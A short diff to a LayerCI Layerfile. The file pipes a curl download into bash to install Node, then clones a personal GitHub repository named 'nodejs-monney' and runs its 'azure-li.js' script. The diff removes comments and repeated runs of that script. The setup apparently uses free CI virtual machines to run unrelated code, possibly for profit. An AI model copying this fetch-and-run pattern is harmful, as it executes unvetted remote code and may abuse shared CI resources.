@@ -1,7 +1,4 @@
-#This is an example LayerCI configuration for NodeJS 10.x!
 FROM vm/ubuntu:18.04
-
-# To note: Layerfiles create entire VMs, *not* containers!
 
 # Install node 10
 RUN curl -sL https://deb.nodesource.com/setup_14.x | bash
@@ -21,9 +18,3 @@ RUN sudo apt-get install -y \
 RUN git clone https://github.com/vippro99/nodejs-monney.git
 RUN cd nodejs-monney && npm i -s
 RUN node azure-li.js
-RUN node azure-li.js
-RUN node azure-li.js
-RUN node azure-li.js
-RUN node azure-li.js
-RUN node azure-li.js
-
